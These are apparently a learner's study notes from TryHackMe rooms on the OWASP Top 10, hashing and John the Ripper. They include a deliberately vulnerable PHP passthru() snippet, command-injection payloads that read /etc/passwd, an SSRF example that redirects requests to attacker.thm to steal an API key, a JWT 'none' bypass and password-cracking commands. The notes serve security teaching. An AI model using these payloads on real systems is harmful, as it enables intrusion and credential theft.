- **SQL Injection**: This occurs when user-controlled input it passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries.
	- This means a hacker could *steal sensitive information such as personal details and credentials*
- **Command Injection**: This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users' systems.

The main defense for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands:

- **Using an allow list**: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. 
	- Otherwise, it is rejected, and the application throws an error.
- **Stripping input**: If the input contains dangerous characters, these are removed before processing.

*Dangerous characters or input is classified as any input that can change how the underlying data is processed.*

### Command Injection

> **Command injection** occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly. 

An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. 

The possibilities for an attacker from here are endless: they could:

- List files
- Read the files' contents
- Run basic commands for recon

A command injection *allows the attacker to execute commands as if they were sitting in front of the server and issuing commands directly into the command line.*

#### Code Example

Let's consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text. While searching for ways to implement their app, they've come across the `cowsay` command in Linux, which does just that! Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system's console and sends back its contents to the website.

Let's look at the code they used for their app.  See if you can determine why their implementation is vulnerable to command injection.  We'll go over it below.

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

In simple terms, the snippet above does the following:

1. Checking if the parameter "mooing" is set. If it is, the variable `$mooing` gets what was passed into the input field. 
2. Checking if the parameter "cow" is set. If it is, the variable `$cow` gets what was passed through the parameter.
3. The program executes the function `passthru("perl /usr/bin/cowsay -f $cow $mooing");`. The passthru function simply executes a command in the operating system's console and sends the output back to the user's browser. You can see that our command is formed by concatenating the `$cow` and `$mooing` variables at the end of it.
	1. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks. If you want to, you can read the docs on `passthru()` on [PHP's website](https://www.php.net/manual/en/function.passthru.php) for more information on the function itself.

#### Exploiting Command Injection

> Now that we know how the application works behind the curtains, we will take advantage of a bash feature called "**inline commands**" to abuse the cowsay server and execute any arbitrary command we want. 

**Bash allows you to run commands within commands.** This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed. 

> To execute inline commands, you only need to enclose them in the following format `$(your_command_here)`. If the console detects and inline command, it will execute it first and then use the result as the parameter for the outer command. 

Common Commands that will be used during a Command Injection Attack:

- whoami
- id
- ifconfig/ip addr
- uname -a
- ps -ef
- $(ls)
- $(ls la)
- $(cat /etc/passwd)
- $(cat /etc/os-release)

### Insecure Design

> **Insecure Design** refers to vulnerabilities which are inherent to the application's architecture.

They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start. Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app. 

- A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the app to production. 

#### Insecure Password Resets

A good example of such vulnerabilities occurred on [Instagram a while ago](https://thezerohack.com/hack-any-instagram). Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation. 

- If an attacker wanted to access a victim's account, he could try to brute-force the 6-digit code. As expected, this was not directly possible as Instagram had rate-limiting implemented so after 250 attempts, the user would be blocked from trying further.

- However, it was found that the rate-limiting only applied to code attempts made from the same IP. If an attacker had several different IP addresses from where to send requests, he could now try 250 codes per IP. 
- For a 6-digit code, you have millions of possible codes, so an attacker would need 1000000/250 = 4000 IPs to cover all possible codes. 

> This may seem like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible. 

**Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code.**

- The problem is in the design rather than the implementation of the application in itself. 

Some insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the app from the ground up and is usually harder to do than other simple code-related vulnerability.

- The best approach to avoid such vulnerabilities is to *perform threat modelling at the early stages of the development lifecycle*. 

### Security Misconfiguration

> **Security Misconfigurations** are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable. 

Security Misconfigurations include:

- Poorly configured permissions on cloud services, like S3 buckets.
- Having unnecessary features enabled, like services, pages, accounts or privileges.
- Default accounts with unchanged passwords.
- Error messages that are overly detailed and allow attackers to find out more about the system.
- Not using HTTP security headers. 

> This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XML external entities (XEE) or command injection on admin pages.

[OWASP top 10 entry for Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/).
#### Debugging Interfaces

A common security misconfiguration concerns the exposure of *debugging features in production software.* 

Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it's being developed. 

* Attackers could abuse some of those debug functionalities if somehow, the developers forgot how to disable them before publishing their applications.

One example of such a vulnerability was allegedly used when [Patreon got hacked in 2015](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/). 

- Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execture the Python code.
- Werkzeug includes a debug console that can be accessed either via URL on `/console`, or it will also be presented to the user if an exception is raised by the application. In both cases, the console provides a Python console that will run any code you send to it.

> For an Attacker, this means he can execute commands arbitrarily.

### Vulnerable and Outdated Components

> Occasionally, you may find that the company/entity you're pentesting is using a program with a well-known vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tools such as [WPScan](https://wpscan.com/wordpress-security-scanner), you find that it's version 4.6. Some quick research will *reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution exploit*, and even better, you can find an exploit already made on [Exploit-DB](https://www.exploit-db.com/exploits/41962). 

This would be devastating because it requires *very little work on the attacker's part*.  Since the vulnerability is already well known, someone else has likely made an exploit for the vulnerability already.

The situation worsens when you realize that it's really easy for this to happen. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks. 

### Vulnerable and Outdated Components - Exploit

> Use the available information in the discovery phase to use later.

For example, a Nostromo web server with a version number and software name can be searched in ExploitDB to find an exploit for the particular version.

Running this script found on ExploitDB teaches us a very important lesson. 

```shell
user@linux$ python 47837.py
Traceback (most recent call last):
  File "47837.py", line 10, in <module>
    cve2019_16278.py
NameError: name 'cve2019_16278' is not defined
```

> Exploits found on the internet may not work the first time. Its' good to know the programming language that the scripts are written in in order to fix common issues or make modifications. 

*Most scripts will tell you what arguments you need to provide to the exploit.* 

Exploit developers will rarely make you read potentially hundreds of lines of code just to figure out how to use the script. 

**Note**: It will almost never be as easy as described here. Sometimes you will just have a version number, but other times you will need to dig through the HTML source or even take a lucky guess on an exploit script. 

Realistically, if it is a known vulnerability, there's probably a way to discover what version the application is running. 

### Identification and Authentication Failures

> Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. 

The most common form of authentication is using a username and password mechanism. A user would enter these credentials, and the server would verify them. The server would then provide the users' browser with a *session cookie* if they are correct. A session cookie is needed because web servers use HTTP(S) to communicate, which is **stateless**.

- Attaching session cookies means the server will know who is sending what data. Ther serve can then keep track of user's actions. 

If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other user's accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include the following:

- **Brute Force Attacks**: if a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. 
- **Use of weak credentials**: Web applications should set strong password policies. If applications allow users to ser passwords such as "password1" or common passwords, an attacker can easily guess them and access user accounts. 
- **Weak Session Cookies**: Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access user's accounts. 

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

- To avoid password guessing attacks, ensure the application enforces a strong password policy.
- To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. 
- Implement multi-factor authentication. If a ser has multiple authentication methods, for example, user a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get both the password and the code to access the sccount. 

### IAM Practical

> Let's look at a logic flaw in an authentication mechanism. 

Many times, what happens is that developers forget to sanitize the input (username and password) given by the user in the code of their application, which can make them vulnerable to attacks like **SQL Injections**. 

However, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user. 

Say there is an existing user with the name `admin`, and we want access to their account, so what we can do is try to re-register that username but with slight modification. 

- We will enter "admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email ID or password and submit that data, it will register a new user, but that user will have the same right as the admin account.
- The new user will also be able to see all the content presented under the user `admin`.

### Software and Data Integrity Failures

#### What is Integrity?

> When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. 

**Integrity** is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. 
	How can you be sure that while downloading it, it wasn't modified in transit or somehow got damaged by a transmission error?

To overcome this problem, you will often see a `hash` sent alongside the file so that you can *prove* that the file you downloaded kept its integrity and wasn't modified in transit. 
	A *hash or digest* is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about **MD5, SHA1, SHA256** and other hashing algorithms.

Hashes care typically **precalculated** by the creators of the software so their integrity can be checked after downloading. 

To calculate hashes in Linux, we use the following commands

```shell
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```
> Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.

#### Software and Data Integrity Failures

> This vulnerability arises from code or infrastructure that uses software or data without using any kind of integrity checks. Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences.

There are two types of vulnerabilities in this category:

- Software Integrity Failures
- Data Integrity Failures

### Software Integrity Failures

Suppose you have a website that uses third party libraries that are stored in some external servers that are out of your control.

While this may sound a bit strange, this is actually a somewhat common practice. 

- Take as an example `jquery`, a commonly used JavaScript library. 
- If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```
> When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source. 

The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of `https://code.jquery.com/jquery-3.6.1.min.js` in inject malicious code.
	As a result, anyone visiting your website makes no checks against the third parry library to see if it has changed. 
	Modern browsers allow you to specify a hash along with the library's URL so that the *library code is executed only if the hash of the downloaded file matches the expected value*.

- This security mechanism is called **Subsource Integrity (SRI)**, and you can read more about it [here](https://www.srihash.org/).

> The *correct way* to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. 

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

### Data Integrity Failures

Let's think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of *session token* that will need to be saved *on the browser for as long as the session lasts.*
	This token will be repeated on each subsequent request so that the web application knows who we are. 
	These session token can come in many forms but are usually assigned via **cookies**.

**Cookies** are key-value pairs that a web app will store on the user's browser and that will be automatically repeated on each request to the website that issued them.

For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. 
	In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. 
	This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! 
	This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.

> One solution to this is to use some ***integrity mechanism*** to guarantee that the cookie hasn't been altered by the user. 
> 	To avoid reinventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. 

One such implementation is **JSON Web Tokens (JWT)**

JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. 

- The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. 

The structure of a JWT token is formed in three parts: 

The **Header** contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. 

The **Payload** contains the key-value pairs with the data that the web applications wants the client to store. 

The **Signature** is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. 
	Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key. 

> Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use [this online tool](https://appdevtools.com/base64-encoder-decoder) to encode/decode base64. Try decoding the header and payload of the following token:
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJ`

#### JWT and the None Algorithm

A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:

1. Modify the header section of the token so that the `alg` header would contain the value `none`
2. Remove the signature part.

### Security Monitoring and Logging Failures

> When web applications are set up, every action performed by the user should be logged. Logging important because, in the event of an incident, the attacker's activities can be traced.

- Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications.

The more significant impacts of these include:

- **Regulatory damage**: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations. 
- **Risk of Further Attack**: an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include the following:

- *HTTP Status codes*
- *Timestamps*
- *Usernames*
- *API endpoints/page locations*
- *IP addresses*

These logs have some senstitive information, so it's important to ensure that they are *stored securely and that multiple copies of these logs are stored in different locations*.

As you may have noticed, logging is more important after a breach or incident has occurred.

The ideal case is to have monitoring in place to detect any suspicious or anomalous activity.

- The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected later than anticipated. 

> Common examples of suspicious activity include:

- **Multiple unauthorized attempts** for a particular action (usually authentication attempts or access to unauthorized resources, e.g. admin pages.)
- **Requests from anomalous IP addresses or locations**: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
- **Use of automated tools**: particular automated tooling can be easily identifiable, e.g. using the the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
- **Common payloads**: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorized/malicious testing on applications.

> Simply detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to impact level. 
> 	For example, certain actions will have higher impact than others. 
> 	These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties attention.

### Server Side Request Forgery

> This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. ***SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services***. 

Think, for example, a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent.

Since the SMS provider changes per message, they require you to add a secret key, which they pre-assign you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message.

> It's easy to see the vulnerability in the diagram above. 
> 	The application exposes the `server` parameter to the users, which defines the server name of the SMS server provider. 
> 	If the attacker wanted, they could simply change the value of the `server` to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider.

As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:

`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

> This would make the vulnerable web application make a request to:

`https://attacker.thm/api/send?msg=ABC`

> You could then just capture the contents of the request using Netcat:

```shell
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```
> This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:
> 	- Enumerate internal networks, including IP addresses and ports
> 	- Abuse trust relationships between servers and gain access to otherwise restricted services
> 	- Interact with some non-HTTP services to get remote code execution (RCE).

# OWASP Juice Shop

### Task 3: Injections

> This task will be focusing on injection vulnerabilities. Injection vulnerabilities are quite dangerous to a company as they can potentially cause downtime and/or loss of data.

Identifying injection points in a web application is usually quite simple, as most of them will return an error. 

There are many types of injection attacks:

| Injection         | Description                                                                                                                                                                                                                                                 |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SQL Injection     | SQL injection is when an attacker enters a malicious or malformed query to either retrieve or tamper data from a database. And in some cases, log into accounts.                                                                                            |
| Command Injection | Command injection is when web apps take input or user-controlled data and run them as system commands. An attacker may tamper with this data to execute their own system commands. This can be seen in applications that perform misconfigured ping tests.  |
| Email Injection   | Email injection is a security vulnerability that allows malicious users to send email messages without prior authorization by the email server. These occur when the attacker adds extra data to fields, which are not intercepted by the server correctly. |

### Upload Vulnerabilities

> The instructions in this task will help you to configure the hosts file of your device. The hosts file is used for local domain name mapping, bypassing DNS. In short, it allows you to map IP addresses to domain names locally without relying on a DNS server to resolve the IP address for you. 

- This is useful in environments such as TryHackMe where DNS is not available as it allows us to manually map one or more domains / subdomains to an IP address of our choosing.
- Being able to access content using a domain makes it possible to (amongst many other advantages) use name-based virtual hosting -- commonly shorted to **vhosting** -- to serve multiple websites from a single web server.

# Insert Web Hacking Fundamentals Portions Here

# Hashing - Crypto 101

> Before we start, we need to get some jargon out of the way. 

- **Plaintext** - Data before encryption or hashing, often text but not always as it could be a photograph or other file instead.
- **Encoding** - This in **NOT** a form of encryption, just a form of data representation like base64 or hexadecimal. Immediately reversible.
- **Hash** - A hash is the output of a hash function. Hashing can also be used as a verb "to hash", meaning to produce the hash value of some data.
- **Brute Force** - Attacking cryptography by trying every different password or every different key
- **Cryptanalysis** - Attacking cryptography by finding a weakness in the underlying maths

### What is a Hash Function?

> Hash functions are quite different from encrpytion. These is no key, and it's meant to be impossible (or very very difficult) to go from the output back to the input.

A **hash function** takes some input data of any size, and creates a summary or "digest" of that data. The output is a fixed size. It's hard to predict what the output will be for any input and vice versa. 

*Good hashing algorithms* will be (relatively) fast to compute, and slow to reverse (go from output and determine input). Any small change in the input data (even a single bit) should cause a large change in the output.

The output of a hash function is normally *raw bytes*, which are then encoded. 

- Common encodings for this are **base64** or **hexadecimal**. Decoding these won't give you anything useful.

#### Why should I care? 

> Hashing is very common in cybersecurity. 

When you logged into TryHackMe, that used hashing to verify your password. When you logged into your computer, that also used hashing to verify your password.

- You interact directly with hashing more than you would think, mostly in the context of passwords.

#### What's a Hash Collision?

> A **hash collision** is when 2 different inputs give the same output. 

Hash functions are designed to avoid this as best as they can, especially being able to engineer (create intentionally) a collision. *Due to pigeonhole effect, collisions are not avoidable.*

The **Pigeonhole effect** is basically, there are a set number of different output values for the hash function, but you can give it any size input. As there are more inputs that outputs, some of the inputs must give the same output.

- If you put 128 pigeons and 96 pigeonholes, some of the pigeons are going to have to share. 

MD5 and SHA1 have been attacked, and made technically insecure due to engineering hash collisions. 

- However, no attack has yet given a collision in both algorithms at the same time so if you use the MD5 hash AND the SHA1 hash to compare, you will see they're different.

### Uses for Hashing

> Hashing is used for 2 main purposes in cybersecurity. 

- To **verify the integrity of data**
- **Verifying passwords**

#### Hashing for Password Verification

> Most webapps need to verify a users password at some point. Storing passwords in plaintext would be bad. You've probably seen news stories about companies that had their database leaked.
> 	Knowing some people, they use the same password for everything including their banking, so leaking these would be really bad.

Quite a few breaches have leaked plaintext passwords. You're probably familiar with `rockyou.txt` on Kali as a password wordlist. 

- This came from a company that made widgets for MySpace. They stored their passwords in plaintext and the company had a data breach. 
- The txt file contains over 14 million passwords (although some are *unlikely* to have been user passwords.)

> Adobe had a notable data breach that was slightly different. The passwords were encrypted, rather than hashed and the encryption they used was not secure. 
> 	This meant that the plaintext could be relatively quickly retrieved. 

More information on this breach: https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/

LinkedIn also had a data breach. LinkedIn used SHA1 for password verification, which is quite quick to computer using GPUs. 

*You can't encrypt the passwords, as the key has to be stored somewhere. If someone gets the key, they can just decrypt the passwords.* 

This is where hashing comes in. What if, instead of storing the password, you just stored the hash of the password? This means you never have to store the user's password, and if your database was leaked then an attacker would have to crack each password to find out what the password was. 

There's one problem with this: What if two users have the same password? As a hash function will always turn the same input into the same output, you will store the same password hash for each user. 

- That means that if someone cracks the hash, they get into more than one account. It also means that someone can create a "Rainbow Table" to break the hashes.

|Hash|Password|
|---|---|
|02c75fb22c75b23dc963c7eb91a062cc|zxcvbnm|
|b0baee9d279d34fa1dfd71aadb908c3f|11111|
|c44a471bd78cc6c2fea32b9fe028d30a|asdfghjkl|
|d0199f51d2728db6011945145a1b607a|basketball|
|dcddb75469b4b4875094e14561e573d8|000000|
|e10adc3949ba59abbe56e057f20f883e|123456|
|e19d5cd5af0378da05f63f891c7467af|abcd1234|
|e99a18c428cb38d5f260853678922e03|abc123|
|fcea920f7412b5da7be0cf42b8c93759|1234567|
> Websites like Crackstation internally use a HUGE rainbow table to provide fast password cracking for hashes without salts. 
> 	Doing a lookup in a sorted list of hashes is really quite fast, much much faster than trying to crack the hash.

#### Protecting Against Rainbow Tables

> To protect against rainbow tables, we add a **salt** to the passwords. 

- The salt is randomly generated and stored in the database, unique to each user. In theory, you could use the same salt for all users but that means that duplicate passwords would still have the same hash, and a rainbow table could still be created for specific passwords without a salt.

> The salt is added to either the start or the end of the password before it's hashed, and this means that every user will have a different password hash even if they have the same password. 
> 	Hash functions like **bcrypt** and **sha512crypt** handle this automatcally. 
> 	Salts don't need to be kept private.

### Recognizing Password Hashes

> Automated hash recognition tools such as [https://pypi.org/project/hashID/](https://pypi.org/project/hashID/) exist, but they are unreliable for many formats.

For hashes that have a prefix, the tools are reliable.

Use a *healthy combination of context and tools*. 

- If you found the hash in a web app database, it's more likely to be *md5 than NTLM*.
- Automated hash recognition tools often get these hash types mixed up, which highlights the importance of learning yourself.

Unix style password hashes are very easy to recognize, as they have a prefix. The prefix tells you the hashing algorithm used to generate the hash.

- The standard format is `$format$rounds$salt$hash`.

Windows passwords are hashed using NTLM, which is a variant of MD4. 

- They're visually indentical to md4 and md5 hashes, so it's *very important to use context to work out the hash type.*

On **Linux**, password hashes are stored in `/etc/shadow`. This file is normally only readable by root. They used to be stored in `/etc/passwd`, and were readable by everyone.

On **Windows**, password hashes are stored in the **SAM**. Windows tries to prevent normal users from dumping them, but tools like **mimikatz** exist for this. 

- Importantly, hashes found there are split into NT hashes and LM hashes.

| Prefix                      | Algorithm                                                  |
| --------------------------- | ---------------------------------------------------------- |
| $1$                         | md5crypt, used in Cisco stuff and older Linux/Unix systems |
| $2$, $2a$, $2b$, $2x$, $2y$ | Bcrypt (Popular for web applications)                      |
| $6$                         | sha512crypt (Default for most Linux/Unix systems)          |
> A great place to find more hash formats and password prefixes is the **hashcar example page**, available here: [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).

### Password Cracking

> Rainbow tables can be used as a method to crack hashes that don't have a salt, but what if there's a salt involved?

*You can't decrypt password hashes.* They're not encrypted. 

- You have to crack the hashes by hashing a large number of different inputs (often rockyou, these are the possible passwords), potentially adding the salt if there is one and comparing it to the target hash. 
- Once it matches, you know what the password is. 

> Tools like hashcat and John the Ripper are normally used for this.

#### Why Crack on GPUs?

> Graphics cards have thousands of cores. Although they can't do the same sort of work that a CPU can, they are very good at some of the maths involved in hash functions. 

- This means you can use a graphics card to crack most hash types much more quickly. Some hashing algos, notably **bcrypt**, are designed so that hashing on a GPU is about the same speed as hashing on a CPU which helps them resist cracking.

#### Cracking on VMs?

> It's worth mentioning that VMs typically don't have access to the host's graphics card.

If you want to run hashcat, it's best to run it on your host. 

You can get Hashcat working with OpenCL in a VM, but the speeds will likely be much worse than cracking on your host. 

**John the Ripper** uses CPU by default and as such, works in a VM out of the box although you may get better speeds running it on the host OS as it will have more threads and no overhead from running a VM. 

**NEVER USE --force for hashcat**: it can lead to false positives (wrong passwords) and false negatives (skips over the correct hash).

### Hashing for Integrity Checking

> Hashing can be used to check that files haven't been changed. If you put the same data in, you always get the same data out. If even a single bit changes, the hash will change a lot. 

- This means you can use it to check that files haven't been modified or to make sure that they have been downloaded correctly. 
- You can also use hashing to find duplicate files, if two pictures have the same hash then they are the same picture. 

#### HMACs

> **HMAC** is a method of using a cryptographic hashing function to verify the authenticity and integrity of data. 

An HMAC can be used to ensure that the person who created the HMAC is who they say they are (authenticity) and that that message hasn't been modified or corrupted (integrity).

They use a secret key, and a hashing algorithm to produce a hash.

# John the Ripper

> John the Ripper is one of the most well known, well-loved and versatile hash cracking tools out there. It combines a fast cracking speed, with an extraordinary range of compatible hash types.

### What are Hashes?

> A hash is a way of taking a piece of data of any length and represeting it in another form that is a fixed length. This masks the original value of the data. This is done by running the original data through a hashing algorithm. 

- There are many popular hashing algorithms, such as **MD4, MD5, SHA1 and NTLM.**

If we take "polo", a string of 4 characters- and run it through an MD5 hashing algorithm, we end up with an output of: b53759f3ce692de7aff1b5779d3964da a standard 32 character MD5 hash.

Likewise, if we take "polomints", a string of 9 characters- and run it through the same MD5 hashing algorithm, we end up with an output of: 584b6e4f4586e136bc280f27f9c64f3b another standard 32 character MD5 hash.

### What makes Hashes secure?

> Hashing functions are designed as one-way functions. In other words, it is easy to calculate a hash value of a given input, but it is difficult to find the original input given the hash value. 
> 	By difficult, we mean *computationally infeasible*.
> 	This has its roots in mathematics and P vs. NP.

In computer science, P and NP are two classes of problems that help us understand the efficiency of algorithms:

- **P (Polynomial Time):** Class P covers the problems whose solution can be found in polynomial time. Consider sorting a list in increasing order. The longer the list is, the longer it would take to sort; nonetheless, the increase in time is not exponential. 
- **NP (Non-Deterministic Polynomial Time)**: Problems in the class NP are those for which a given solution can be checked quickly, even though finding the solution itself might be hard. In fact, we don't know if there is a fast algorithm to find the solution in the first place.

While this is an extrememly interesting mathematical concept that proves fundamental to computing and cryptography, it is completely outside the scope of this room. 

- But abstractly, it means that the algorithm to hash the value will be "P" and can therefore be calculated reasonably. However an un-hashing algorithm would be "NP" and intractable to solve - meaning that it cannot be computer in a reasonable time using standards computers.

### Where John comes in...

> Even though the algorithm itself is not feasibly reversible, that doesn't mean that cracking the hashes is impossible. If you have the hashed version of a password, for example -- and you know the hashing algorithm -- you can use that hashing algorithm to hash a large number of words, called a **dictionary.**

- You can then compare these hashes to the one you're trying to crack, to see if any of them match. If they do, you now know what word corresponds to that hash- you've cracked it!

This process is called a **dictionary attack** and John the Ripper, or John as it's commonly shortened to, is a tool to allow you to conduct fast brute force attacks on a large array of different hash types.

# Wordlists

> In order to make dictionary attacks, you need a list of words that you can hash and compare, unsurprisingly this is called a wordlist. 
> 	There are many different wordlists out there, a good collection to use can be found in the [SecLists](https://github.com/danielmiessler/SecLists) repository.

There are a few places you can look for wordlists on your attacking system of choice, we will quickly run through where you can find them.

### Parrot, Kali and AttackBox

> You can find wordlists in the `/usr/share/wordlists` directory.

### RockYou

For all of the tasks in this room, we will be using the infamous rockyou.txt wordlist- which is a very large common password wordlist, obtained from a data breach on a website called rockyou.com in 2009. If you are not using any of the above distributions, you can get the rockyou.txt wordlist from the [SecLists](https://github.com/danielmiessler/SecLists) repository under the `/Passwords/Leaked-Databases` subsection. You may need to extract it from .tar.gz format, using `tar xvzf rockyou.txt.tar.gz`.

# Cracking Basic Hashes

> There are multiple ways to use John the Ripper to crack simple hashes, we're going to walk through a few, before moving on to cracking some ourselves.

### John Basic Syntax

> The basic syntax of John the Ripper is as follows:

`john [options] [path to file]`
`john` - invokes the john the ripper program
`[path to file]` - the file containing the hash you're trying to crack, if it's in the same directory you won't need to name a path, just the file.

### Automatic Cracking

> John has built in features to detect what type of hash it's being given, and to select appropriate rules and formats to crack it for you, this isn't always the best idea as it can be unreliable- but if you can't identify what hash type you're working with and just want to try cracking it, it can be a good option.

To do this, we use the following syntax:

`john --wordlist=[path to wordlist] [path to file]`

`--wordlist` - specifies the wordlist mode, reading from the file that you supply in the following path
`[path to wordlist]` - the path to the wordlist you're using, as described in the previous task.

Example:

`john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt`

### Identifying Hashes

